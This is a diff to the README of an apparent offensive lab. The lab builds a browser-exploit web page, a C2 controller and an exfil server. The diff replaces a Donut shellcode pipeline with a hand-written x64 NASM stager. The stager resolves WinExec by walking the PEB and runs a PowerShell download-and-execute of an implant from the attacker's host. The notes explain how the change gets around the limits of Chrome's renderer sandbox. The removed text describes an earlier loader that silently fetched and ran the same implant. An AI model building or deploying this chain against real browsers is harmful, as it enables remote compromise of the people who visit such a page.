@@ -38,11 +38,11 @@ This lab implements a 2-container offensive pipeline:
 │       ├── Makefile            # Builds Linux + Windows binaries; accepts C2_HOST_IP= to bake IP in
 │       └── bin/                # Build output (gitignored — rebuilt by Docker)
 ├── exfil-server/
-│   ├── Dockerfile              # Multi-stage (Debian builder): compiles loader.exe, runs Donut, compiles implant.exe, builds file server
+│   ├── Dockerfile              # Multi-stage (Debian builder): patches shellcode into exploit.js, compiles implant.exe, builds file server
 │   ├── shellcode-generation/
-│   │   ├── loader.c            # Windows downloader: downloads implant.exe from exfil-server and executes it
-│   │   ├── Makefile            # Compiles loader.exe (mingw-w64) then converts to shellcode via Donut; accepts HOST_IP=
-│   │   └── donut               # Donut binary (Linux x64) — converts PE to position-independent shellcode
+│   │   ├── src/stager.asm      # Flat x64 NASM shellcode — PEB walk → WinExec(powershell ...) — runs in-place on RWX WASM page
+│   │   ├── bin/                # Build output: stager_patched.asm, final_shellcode.bin (pre-built by launch.sh)
+│   │   └── Makefile            # Substitutes HOST_IP into stager.asm, assembles with nasm; accepts HOST_IP=
 │   ├── exploit-contents/
 │   │   ├── index.html          # CVE exploit webpage
 │   │   ├── exploit.js          # Exploit script (shellcode array patched at Docker build time)
@@ -72,10 +72,9 @@ Controller reads `C2_PORT` from the environment at startup to determine which po
 - Docker image: `docker-exfil-server`
 - Build: **multi-stage** using Debian as the builder
   - Stage 1 (`builder`):
-    1. Compiles `loader.c` → `loader.exe` (mingw-w64 cross-compile) with `SERVER_URL=http://<host-ip>:8000/implant.exe` baked in
-    2. Runs Donut on `loader.exe` → `loader.bin` (position-independent shellcode)
-    3. Patches the shellcode byte array into `exploit.js`
-    4. Compiles `implant.exe` from source with C2 host IP baked in
+    1. Copies pre-built `final_shellcode.bin` (assembled by `launch.sh` before Docker runs)
+    2. Patches the shellcode uint32 array into `exploit.js`
+    3. Compiles `implant.exe` from source with C2 host IP baked in
   - Stage 2: installs `nodejs`, `npm`, Python; copies compiled `implant.exe` and patched exploit site
 - Runs:
   - Node.js exploit site on port `8888`
@@ -138,7 +137,8 @@ sudo ./launch.sh
 3. Prompt for your host IP — auto-fills with `vboxnet0` if detected, creates `.env` automatically
 4. Stop any existing lab containers
 5. Check for port conflicts on 4444, 8000, 8888
-6. Run `docker compose up --build -d` — msfvenom runs inside the Docker build to generate shellcode and patch `exploit.js`
+6. Build shellcode locally: `make HOST_IP=<ip>` in `shellcode-generation/` assembles `final_shellcode.bin` from `stager.asm`
+7. Run `docker compose up --build -d` — Docker copies the pre-built shellcode and patches it into `exploit.js`
 7. Verify both containers are running and print a summary
 
 ### Other useful commands
@@ -315,18 +315,18 @@ Select a command:
 
 ---
 
-### Bug 8 — msfvenom replaced with custom loader + Donut shellcode pipeline
+### Bug 8 — Donut shellcode replaced with flat NASM stager
 
-**Files:** `exfil-server/shellcode-generation/loader.c`, `exfil-server/shellcode-generation/Makefile`, `exfil-server/Dockerfile`
+**Files:** `exfil-server/shellcode-generation/src/stager.asm`, `exfil-server/shellcode-generation/Makefile`, `exfil-server/Dockerfile`
 
-**Problem:** The msfvenom-generated shellcode ran a generic PowerShell one-liner. Replacing it with a purpose-built loader allows full control over the download-and-execute logic (paths, flags, error codes) while keeping the shellcode compact.
+**Problem:** Donut-generated shellcode (and the custom `loader.c` → Donut pipeline before it) requires `VirtualAlloc(PAGE_EXECUTE_READWRITE)` at runtime to unpack a PE into memory. Chrome's renderer sandbox blocks all `VirtualAlloc` calls with executable flags — the allocation returns `NULL` and execution faults immediately with `STATUS_ACCESS_VIOLATION`. This applies to any Donut-wrapped binary, including a Donut-wrapped injector that tries to inject into another process: Donut itself needs executable memory before it can do anything.
 
-**Fix:** Introduced a custom Windows downloader (`loader.c`) that uses `URLDownloadToFileA` + `CreateProcessA` to fetch and silently execute `implant.exe`. The build pipeline is:
-1. `loader.c` is cross-compiled to `loader.exe` by mingw-w64 with `SERVER_URL=http://<host-ip>:8000/implant.exe` baked in via `-D` flag
-2. Donut converts `loader.exe` → `loader.bin` (position-independent shellcode)
-3. A Python script patches the shellcode byte array into the `var shellcode = [...]` line of `exploit.js`
+**Fix:** Replaced the entire Donut pipeline with a single flat x64 NASM shellcode (`stager.asm`, ~300 bytes). It runs entirely in-place on the RWX WASM page the exploit already owns:
+1. Walks the PEB (`GS:[0x60]`) to find `kernel32.dll` base without any imports
+2. Parses the PE export table to resolve `WinExec`
+3. Calls `WinExec` with an embedded PowerShell command that downloads and runs `implant.exe`
 
-The builder stage now uses `debian:bookworm-slim` (lighter than Kali) since `msfvenom` is no longer needed — only `mingw-w64`, `make`, and `python3`.
+PowerShell runs as an unsandboxed process and handles the download — no new executable memory needed inside the renderer. The stager is pre-assembled locally by `launch.sh` (`make HOST_IP=<ip>`) before Docker builds, so the Dockerfile simply copies `final_shellcode.bin` and patches it into `exploit.js`.
 
 ---
 
